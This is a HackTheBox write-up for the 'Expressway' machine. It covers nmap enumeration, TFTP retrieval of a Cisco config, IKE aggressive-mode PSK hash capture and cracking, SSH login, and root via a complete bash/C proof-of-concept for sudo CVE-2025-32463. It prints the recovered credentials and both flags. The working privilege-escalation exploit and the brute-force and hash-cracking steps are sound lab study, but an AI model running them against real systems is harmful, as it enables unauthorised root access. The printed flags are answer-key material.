@@ -1,0 +1,205 @@
+Machine: Expressway
+Platform: Linux
+Ip address: 10.10.11.87
+Target: User Flag, Root Flag
+
+NMAP SCAN
+$ sudo nmap -sT -A 10.10.11.87                
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 09:03 EDT
+Nmap scan report for 10.10.11.87
+Host is up (0.060s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   65.57 ms 10.10.14.1
+2   65.77 ms 10.10.11.87
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.53 seconds
+
+Here we can see that only SSH is open so lets try brute forcing it using Medusa
+
+$ medusa -h 192.168.1.100 -U usernames.txt -P /usr/share/wordlists/passwords.txt -M ssh -t 10
+
+Unfortunately nothing was returned. So lets move the scan to UDP
+$ nmap -sU 10.10.11.87
+Nmap scan report for 10.10.11.87
+Host is up (0.17s latency).
+Not shown: 996 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+68/udp   open|filtered dhcpc
+69/udp   open|filtered tftp
+500/udp  open          isakmp
+4500/udp open|filtered nat-t-ike
+
+Nmap done: 1 IP address (1 host up) scanned in 1089.82 seconds
+
+That shows some intresting things. 
+The ports are DHCP, tftp, And IKE. 
+This shows a VPN bases setup, a stripped down FTP server and a DHCP server for assigning IP addresses. Definitely a VPN setup.
+
+Lets try a much more aggressive scan using scripts for each of these services.
+$ sudo nmap -sU -p68,69,500,4500 -Pn --script ike-version,broadcast-dhcp-discover,tftp-enum 10.10.11.87
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 09:42 EDT
+Pre-scan script results:
+| broadcast-dhcp-discover: 
+|   Response 1 of 1: 
+|     Interface: eth0
+|     IP Offered: 172.16.0.17
+|     DHCP Message Type: DHCPOFFER
+|     Server Identifier: 172.16.0.1
+|     Subnet Mask: 255.255.0.0
+|     IP Address Lease Time: 1d00h00m00s
+|     Router: 172.16.0.1
+|     Domain Name Server: 1.1.1.1, 8.8.8.8, 103.170.228.26
+|     Renewal Time Value: 12h00m00s
+|_    Rebinding Time Value: 21h00m00s
+Nmap scan report for 10.10.11.87
+Host is up (0.088s latency).
+
+PORT     STATE         SERVICE
+68/udp   open|filtered dhcpc
+69/udp   open          tftp
+| tftp-enum: 
+|_  ciscortr.cfg
+500/udp  open          isakmp
+| ike-version: 
+|   attributes: 
+|     XAUTH
+|_    Dead Peer Detection v1.0
+4500/udp open|filtered nat-t-ike
+
+Nmap done: 1 IP address (1 host up) scanned in 65.64 seconds
+
+
+Running those scripts shows that we have a TFTP file named ciscortr.cfg. Lets try fetching it using tftp client.
+$ tftp            
+(to) 10.10.11.87
+tftp> status
+Connected to 10.10.11.87.
+Mode: netascii Verbose: off Tracing: off Literal: off
+Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
+tftp> get ciscortr.cfg
+tftp> quit
+                                                                                                                                                                                                                                       
+┌──(kali㉿voldmort)-[~/HackTheBox/Machines]
+└─$ ls
+ciscortr.cfg
+
+inspecting the file it gives us some intresting things
+in line 28:``` username ike password ***** ```
+this could be the username we can use to login via ssh.
+and also there is a line in the cfg file:
+
+crypto isakmp client configuration group rtr-remote
+    key secret-password
+    dns 208.67.222.222
+    domain expressway.htb
+
+so that tells that anyone who want to connect to the VPN should use teh group rtr-remote and the password as secret-password.
+ike-scan in aggressive mode is said to leak password hashes, lets try doing that
+
+$ sudo ike-scan --id=rtr-remote 10.10.11.87 -A -M -P
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned
+        HDR=(CKY-R=694098f31533916b)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+5029c2bcdc1667689359b1ff459acbb5d68983590068c7ddb58e2341fccc7eb8dc0772cb78110f4c695e8014bc50bfec32b5f3d1507b6d1119feab0c04887ae542e0db00bb311ea07f3ec19b65ad53f88e2f66935b00ef5f1edb7de9545cd5407b4df089d5b8c2b42286594a9486aab634e211806132ad63daf60e3edba5298e:9acc7b644918a29f10314555f29296b56aaa14edc961c16e7d537169ab475ce0ab1446b069e9be39a8bd672a7d3dbe90ba1d3cc43891e80eb64a66e83a1c53fad2af43608a4d124d3316bf7d138007bfc15547965a5f92ea35854879cb0d1bb553ecc8734dab23fbc2446b0e000d4271eb20bf5d646d5be7449d38a6e72a75d5:694098f31533916b:1aa953e18dc58d10:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:68434a1c8ced9c1be255df27f6e37344aee90791:12809d69c39ba1984a1268cc5f22079acbe15cd2ca1f0a5be840a3849f8ef511:2f5bfe929a3521c126d546a60302bfce95f24374
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.067 seconds (14.86 hosts/sec).  1 returned handshake; 0 returned notify
+
+Now that gives us a PSK hash. lets save it to a file called hash.psk
+Lets try cracking it using psk-crack and rock-you.txt wordlist
+$ psk-crack -d ~/rockyou.txt hash.psk
+that cracks the hash and gives us the password: freakingrockstarontheroad
+
+So now we have a username as well as a password: ike:freakingrockstarontheroad
+lets try ssh now
+ssh ike@10.10.11.87                               
+ike@10.10.11.87 s password: 
+Last login: Fri Oct 17 13:49:11 BST 2025 from 10.10.14.11 on ssh
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Fri Oct 17 14:47:32 2025 from 10.10.14.79
+ike@expressway:~$
+
+The user flag: e954cb506a3431fac10ff22e94d06192
+
+Now we need to move on to the local privilege escalation, so after surfing for a while and looking at some command I found that the sudo version thats being used is 1.9.17 which has a known CVE.
+looking at exploit-db we can see there is a bash script that is used for exploiting this vulnerability. Basically this vulnerability is a logical error in the chroot functionality of the sudo command.
+the expoit is the following:
+*----------------------*
+#!/bin/bash
+# sudo-chwoot.sh – PoC CVE-2025-32463
+set -e
+
+STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
+cd "$STAGE"
+
+# 1. NSS library
+cat > woot1337.c <<'EOF'
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void woot(void) {
+    setreuid(0,0);          /* change to UID 0 */
+    setregid(0,0);          /* change  to GID 0 */
+    chdir("/");             /* exit from chroot */
+    execl("/bin/bash","/bin/bash",NULL); /* root shell */
+}
+EOF
+
+# 2. Mini chroot with toxic nsswitch.conf
+mkdir -p woot/etc libnss_
+echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+cp /etc/group woot/etc            # make getgrnam() not fail
+
+# 3. compile libnss_
+gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+
+echo "[*] Running exploit…"
+sudo -R woot woot                 # (-R <dir> <cmd>)
+                                   # • the first “woot” is chroot
+                                   # • the second “woot” is and inexistent
+command
+                                   #   (only needs resolve the user)
+
+rm -rf "$STAGE"
+*----------------------*
+
+After running this script our shell just shifted to root. 
+$ ./chroot.sh 
+[*] Running exploit…
+root@expressway:/# whoami
+root
+root@expressway:/# 
+
+Now we can simply get the root flag.
+$ cat /root/root.txt
+824369e51a7fdb70a5fa05d79c1ecdb3
+
